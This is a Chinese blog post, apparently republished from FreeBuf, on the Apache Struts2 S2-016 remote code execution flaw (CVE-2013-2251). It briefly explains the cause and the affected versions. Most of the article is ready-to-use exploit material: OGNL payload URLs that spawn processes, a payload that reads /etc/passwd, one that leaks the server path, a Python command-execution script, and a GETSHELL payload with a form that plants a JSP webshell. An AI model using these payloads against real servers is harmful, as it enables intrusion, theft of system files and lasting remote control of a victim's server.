      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/">[更新]Struts2再爆远程代码执行漏洞（S2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="-struts2-s2-016-">[更新]Struts2再爆远程代码执行漏洞（S2-016）</h3>
<p><a href="">phper</a> @ <a href="http://www.freebuf.com/category/vuls" title="查看 漏洞 中的全部文章" target="_blank">漏洞</a> 2013-07-17   </p>
<p><strong>Struts又爆远程代码执行漏洞了！**</strong>在这次的漏洞中，攻击者可以通过操纵参数远程执行恶意代码。<strong>**Struts 2.3.15.1之前的版本，参数action的值redirect以及redirectAction没有正确过滤，导致ognl代码执行。 </strong></p>
<p><strong>描述</strong>
影响版本 Struts 2.0.0 - Struts 2.3.15 报告者 Takeshi Terada of Mitsui Bussan Secure Directions, Inc. CVE编号 CVE-2013-2251</p>
<p><strong>漏洞证明</strong></p>
<p>参数会以OGNL表达式执行
<a href="http://host/struts2-blank/example/X.action?action:%25{3/*4}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{3/*4}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}</a></p>
<p>代码执行</p>
<p><a href="http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a></p>
<p><strong>漏洞原理</strong></p>
<p>The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with “action:” or “redirect:”, followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.</p>
<p>In Struts 2 before 2.3.15.1 the information following “action:”, “redirect:” or “redirectAction:” is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.</p>
<p><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">Apache官方地址</a></p>
<p><strong>国内网站受灾严重</strong></p>
<p><strong><img src="http://static.freebuf.com/uploads/image/20130719/20130719234053_37320.jpg" alt="">
</strong></p>
<p><strong>以下仅供教学研究之用，严禁非法用途！</strong></p>
<p>执行任意命令EXP，感谢X提供：
?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p>爆网站路径EXP，感谢h4ck0r提供：</p>
<p>?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</p>
<p>python执行任意命令，感谢h4ck0r提供</p>
<p>import urllib2,sys,re def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(&quot;%s&quot;%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank<em>line=re.compile(&#39;\x00&#39;) tmp=blank<em>line.sub(&#39;&#39;,tmp) return tmp if <strong>name</strong> == &#39;__main</em></em>&#39;: url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack=&quot;redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{&#39;%s&#39;,&#39;%s&#39;})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}&quot;%(cmd,cmd1) get(url,attack)</p>
<p>GETSHELL EXP，感谢coffee提供：</p>
<p>?redirect:${ %23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%</p>
<p>然后用以下代码写shell:</p>
&lt;form action=&quot;<a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot" target="_blank">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a>; method=&quot;post&quot;&gt; <textarea >code</textarea> <input type=submit value="提交"> </form>

<p>上前目录生成1.jsp</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/struts&Java/">struts&Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/struts&Java/" class="label label-primary">struts&Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 22:45:32"datetime="2014-03-29 22:45:32"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/90/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/88/">88</a></li><li><a class="page-number" href="/page/89/">89</a></li><li><a class="page-number" href="/page/90/">90</a></li><li class="active"><li><span class="page-number current">91</span></li><li><a class="page-number" href="/page/92/">92</a></li><li><a class="page-number" href="/page/93/">93</a></li><li><a class="page-number" href="/page/94/">94</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/161/">161</a></li><li><a class="page-number" href="/page/162/">162</a></li><li><a class="extend next" href="/page/92/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Site powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a>  update time: <em>2014-04-07 17:26:53</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
